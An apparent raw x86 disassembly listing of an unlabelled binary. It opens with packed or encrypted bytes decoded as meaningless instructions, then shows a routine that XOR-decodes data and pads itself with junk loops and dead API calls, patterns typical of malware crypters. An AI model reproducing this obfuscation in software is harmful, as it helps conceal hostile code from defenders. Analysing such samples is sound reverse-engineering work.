  4118f1:	mov    al,BYTE PTR [eax+0x759b7281]
  4118f7:	pop    ebx
  4118f8:	push   edx
  4118f9:	das    
  4118fa:	and    ebx,DWORD PTR [ecx]
  4118fc:	push   esp
  4118fd:	or     BYTE PTR [ebp+0x4a],cl
  411900:	addr16 int 0x5a
  411903:	stos   DWORD PTR es:[edi],eax
  411904:	xor    bl,bh
  411906:	mov    ebx,0x39268f4e
  41190b:	pusha  
  41190c:	data16 jle 0x4118df
  41190f:	loopne 0x4118b7
  411911:	dec    ecx
  411912:	and    eax,edi
  411914:	ja     0x4118b9
  411916:	imul   ecx,edx,0x2f
  411919:	psadbw mm0,QWORD PTR [edi+esi*8-0x38]
  41191e:	mov    esi,DWORD PTR [ecx+0x1637ac9e]
  411924:	inc    ecx
  411925:	sbb    DWORD PTR [edx-0xe],esp
  411928:	mov    esi,0xb780e252
  41192d:	nop
  41192e:	fstp   QWORD PTR [edx]
  411930:	pop    esi
  411931:	and    BYTE PTR [edx-0x16],bh
  411934:	hlt    
  411935:	call   0x998f:0x823801ea
  41193c:	das    
  41193d:	shl    eax,0x53
  411940:	adc    DWORD PTR [esi+0x2b],0x1a
  411944:	ror    BYTE PTR [ebx],1
  411946:	retf   0xec79
  411949:	(bad)  
  41194a:	sti    
  41194b:	je     0x41192b
  41194d:	fisttp WORD PTR [ecx]
  41194f:	cmp    esi,ecx
  411951:	(bad)  
  411952:	adc    BYTE PTR [eax+edi*1+0x4f],al
  411956:	sbb    ch,cl
  411958:	popa   
  411959:	repnz pop es
  41195b:	mov    ecx,0x65d9cb32
  411960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411961:	mov    cl,0x75
  411963:	xchg   edx,eax
  411964:	stos   DWORD PTR es:[edi],eax
  411965:	xchg   ecx,eax
  411966:	mov    ebx,0x4486419e
  41196b:	pop    ecx
  41196c:	mov    ebp,0x6781fc91
  411971:	sub    eax,0xa7874020
  411976:	dec    esi
  411977:	mov    bl,0x6a
  411979:	hlt    
  41197a:	mov    BYTE PTR [eax],0x38
  41197d:	jl     0x4119fb
  41197f:	adc    al,0x36
  411982:	sti    
  411983:	pop    ebx
  411984:	pop    ebx
  411985:	push   eax
  411986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411987:	jg     0x411915
  411989:	test   al,0xd5
  41198b:	inc    edi
  41198c:	test   DWORD PTR [edx-0xc],esi
  41198f:	aaa    
  411990:	mov    ds:0xb8a684e9,al
  411995:	mov    ebx,0xa9de430f
  41199a:	std    
  41199b:	std    
  41199c:	(bad)  
  41199d:	outs   dx,DWORD PTR ds:[esi]
  41199e:	imul   esi,eax,0x45
  4119a1:	(bad)  
  4119a2:	mov    edx,0x6f778077
  4119a7:	fstp   QWORD PTR [esi-0x5f]
  4119aa:	push   ebx
  4119ab:	mov    gs,WORD PTR [ecx-0x7a]
  4119ae:	outs   dx,DWORD PTR ds:[esi]
  4119af:	inc    ecx
  4119b0:	(bad)  
  4119b1:	neg    BYTE PTR [ebp+edx*1+0x1033690b]
  4119b8:	mov    edx,0xaa99c6dc
  4119bd:	es mov eax,0x20a59dbd
  4119c3:	jns    0x411a36
  4119c5:	leave  
  4119c6:	sub    esp,0xf28db08a
  4119cc:	mov    al,0xfc
  4119ce:	dec    dl
  4119d0:	dec    edx
  4119d1:	xchg   ebp,eax
  4119d2:	out    0xa6,eax
  4119d4:	or     dl,BYTE PTR [ebx+0x5c]
  4119d7:	jne    0x41196c
  4119d9:	cmp    dl,BYTE PTR [ebp-0x4924c30b]
  4119df:	or     eax,0x9c26ef56
  4119e4:	cmp    al,0x92
  4119e6:	(bad)  
  4119e7:	icebp  
  4119e8:	pop    edi
  4119e9:	adc    eax,0x995072af
  4119ee:	jbe    0x411a5e
  4119f0:	jno    0x411990
  4119f2:	aaa    
  4119f3:	shr    BYTE PTR [esi-0x16],0x78
  4119f7:	jg     0x411a45
  4119f9:	jg     0x411a38
  4119fb:	bound  ecx,QWORD PTR [edx+esi*8]
  4119fe:	cmp    esi,DWORD PTR [ebp-0x6a]
  411a01:	out    0x0,eax
  411a03:	sub    al,0x46
  411a05:	fadd   QWORD PTR [esp+ebp*4]
  411a08:	dec    eax
  411a09:	cmp    al,0x2e
  411a0b:	xchg   esp,eax
  411a0c:	aas    
  411a0d:	push   0xffffffb4
  411a0f:	daa    
  411a10:	jmp    0x66ee:0x5dded3d9
  411a17:	xchg   ebx,eax
  411a18:	mov    ds:0x186b292b,al
  411a1d:	jmp    0x273b:0x80a86c68
  411a24:	imul   ebp,DWORD PTR [edx+0xa],0x4f
  411a28:	ss call 0xb98b2aa5
  411a2e:	sub    DWORD PTR [ebp+esi*2+0x16],0xaf8d657d
  411a36:	mov    cl,0x35
  411a38:	mov    ss,WORD PTR [ebp+0x4e]
  411a3b:	cmp    DWORD PTR [ebp-0x48ae5af7],edi
  411a41:	sub    DWORD PTR [ebx-0x17e96076],0xffffffed
  411a48:	mov    al,0x13
  411a4a:	scas   al,BYTE PTR es:[edi]
  411a4b:	outs   dx,DWORD PTR ds:[esi]
  411a4c:	fwait
  411a4d:	jmp    FWORD PTR [ebp+0x20172037]
  411a53:	and    edi,ebx
  411a55:	popa   
  411a56:	out    dx,eax
  411a57:	pop    edi
  411a58:	sbb    eax,0x9ab91894
  411a5d:	or     BYTE PTR [esi],0xe2
  411a60:	(bad)  [ebp-0x2d0d042f]
  411a66:	sbb    eax,DWORD PTR [ebp-0x1d036177]
  411a6c:	or     eax,0xc64859ae
  411a71:	push   edi
  411a72:	adc    BYTE PTR [eax+0x32],bh
  411a75:	out    dx,eax
  411a76:	(bad)  
  411a77:	dec    edx
  411a78:	adc    al,0xaf
  411a7a:	mov    eax,0x2962e232
  411a7f:	adc    dh,BYTE PTR [edx]
  411a81:	shr    eax,1
  411a83:	jae    0x411ad3
  411a85:	mov    ds:0xf55731ca,al
  411a8a:	sar    dh,cl
  411a8c:	scas   eax,DWORD PTR es:[edi]
  411a8d:	xchg   ecx,eax
  411a8e:	xchg   esi,eax
  411a8f:	xchg   esi,eax
  411a90:	(bad)  
  411a91:	cmp    bl,al
  411a93:	pusha  
  411a94:	sbb    dl,BYTE PTR [esi+0x77]
  411a97:	fcmovnu st,st(4)
  411a99:	ins    DWORD PTR es:[edi],dx
  411a9a:	pusha  
  411a9b:	(bad)  
  411a9c:	jns    0x411ad6
  411a9e:	xchg   edx,eax
  411a9f:	sub    al,0xa1
  411aa1:	mov    ds:0x55e9a7ec,eax
  411aa6:	sbb    BYTE PTR [edx+0x3560879a],bh
  411aac:	stos   BYTE PTR es:[edi],al
  411aad:	into   
  411aae:	lock jmp 0x411a5b
  411ab1:	out    dx,eax
  411ab2:	xchg   ebp,eax
  411ab3:	in     eax,dx
  411ab4:	jg     0x411a92
  411ab6:	xchg   ecx,eax
  411ab7:	jb     0x411aca
  411ab9:	ffreep st(1)
  411abb:	outs   dx,BYTE PTR ds:[si]
  411abd:	test   eax,0x93fbf7e1
  411ac3:	cs jge 0x411b42
  411ac6:	jns    0x411adc
  411ac8:	push   ecx
  411ac9:	in     al,0xe5
  411acb:	(bad)  
  411acc:	popa   
  411acd:	push   0xd870ba8a
  411ad2:	xor    eax,0x77d6e810
  411ad7:	pop    eax
  411ad8:	jl     0x411b58
  411ada:	fstp   TBYTE PTR [edi-0x7a738c9e]
  411ae0:	hlt    
  411ae1:	aam    0xc1
  411ae3:	cwde   
  411ae4:	mov    esi,0xd9477890
  411ae9:	mov    bl,BYTE PTR [ebp+0x1e1efcd9]
  411aef:	and    DWORD PTR [edi+0x3a17b30b],edx
  411af5:	mov    al,0xb0
  411af7:	ror    edx,0xc
  411afa:	out    dx,al
  411afb:	fs mov esi,ebx
  411afe:	es xor cl,ah
  411b01:	inc    esi
  411b02:	push   esi
  411b03:	adc    dh,BYTE PTR [edi-0xbb78697]
  411b09:	xor    bh,BYTE PTR [esp+eiz*8+0xc]
  411b0d:	mov    edi,DWORD PTR [ebp-0xe]
  411b10:	adc    BYTE PTR [ebp+esi*8-0x2b],dl
  411b14:	leave  
  411b15:	xchg   esi,eax
  411b16:	les    eax,FWORD PTR [ecx+edi*1]
  411b19:	mov    eax,ds:0x6646a29d
  411b1e:	and    eax,0x663ebeaf
  411b23:	test   BYTE PTR [esi],cl
  411b25:	lods   eax,DWORD PTR ds:[esi]
  411b26:	test   eax,0xa831c406
  411b2b:	or     esp,DWORD PTR ds:0xd4355207
  411b31:	mov    esi,?
  411b33:	ins    DWORD PTR es:[edi],dx
  411b34:	or     DWORD PTR es:[ecx+edi*4],ebp
  411b38:	shl    BYTE PTR [edi],cl
  411b3a:	mov    bl,0x6b
  411b3c:	xchg   ebp,eax
  411b3d:	or     BYTE PTR [edi+eiz*4-0x6d],0x2c
  411b42:	fcmovne st,st(5)
  411b44:	ins    BYTE PTR es:[edi],dx
  411b45:	mov    eax,0xbd0ec31c
  411b4a:	inc    esp
  411b4b:	aas    
  411b4c:	es daa 
  411b4e:	hlt    
  411b4f:	jg     0x411b3e
  411b51:	aad    0x83
  411b53:	pusha  
  411b54:	lahf   
  411b55:	pop    ebx
  411b56:	loopne 0x411afc
  411b58:	mov    eax,DWORD PTR [edx+esi*1-0xf]
  411b5c:	mov    ds:0xedb3c3fb,eax
  411b61:	dec    esi
  411b62:	adc    ecx,DWORD PTR [esi+0x4d89dc28]
  411b68:	and    ah,BYTE PTR [ebx+0xd]
  411b6b:	or     al,0xcc
  411b6d:	mov    ebp,0x6dabf2e3
  411b72:	das    
  411b73:	bnd ret 
  411b75:	mov    dl,0xf
  411b77:	jle    0x411b37
  411b79:	sahf   
  411b7a:	mov    BYTE PTR [edx+0x69],0x26
  411b7e:	sbb    al,dl
  411b80:	or     al,0x7d
  411b82:	mov    edx,0x89c66f56
  411b87:	add    eax,0x73a7787f
  411b8c:	fcom   QWORD PTR [eax-0xc]
  411b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b90:	mov    ebx,0xf8d918b1
  411b95:	xchg   DWORD PTR [eax+0x21],eax
  411b98:	test   DWORD PTR [ebx+edi*4],eax
  411b9b:	adc    ebx,DWORD PTR [esi+0xbb26ed9]
  411ba1:	jne    0x411bfb
  411ba3:	je     0x411b5a
  411ba5:	mov    ecx,0x439738b7
  411baa:	adc    ebp,edi
  411bac:	enter  0x17cd,0xd7
  411bb0:	ficomp DWORD PTR [ecx+0x26]
  411bb3:	hlt    
  411bb4:	ins    DWORD PTR es:[edi],dx
  411bb5:	ror    BYTE PTR [ebx+eiz*1+0x6a18ff8d],cl
  411bbc:	aad    0xc5
  411bbe:	xchg   ebp,eax
  411bbf:	push   ss
  411bc0:	into   
  411bc1:	imul   esi,esp,0xffffffb3
  411bc4:	aaa    
  411bc5:	mov    dl,0x1a
  411bc7:	inc    edi
  411bc8:	js     0x411c2f
  411bca:	push   esi
  411bcb:	es das 
  411bcd:	pop    edx
  411bce:	inc    edx
  411bcf:	sbb    ch,BYTE PTR [edi+0x40301030]
  411bd5:	(bad)  
  411bd6:	cdq    
  411bd7:	xor    dh,dl
  411bd9:	sahf   
  411bda:	add    eax,0x5b398305
  411bdf:	xor    DWORD PTR [ebx-0x47],ebx
  411be2:	mov    dh,0x66
  411be4:	push   ds
  411be5:	add    edi,DWORD PTR [edx+0x3cdeaf32]
  411beb:	cdq    
  411bec:	icebp  
  411bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bee:	outs   dx,DWORD PTR ds:[esi]
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
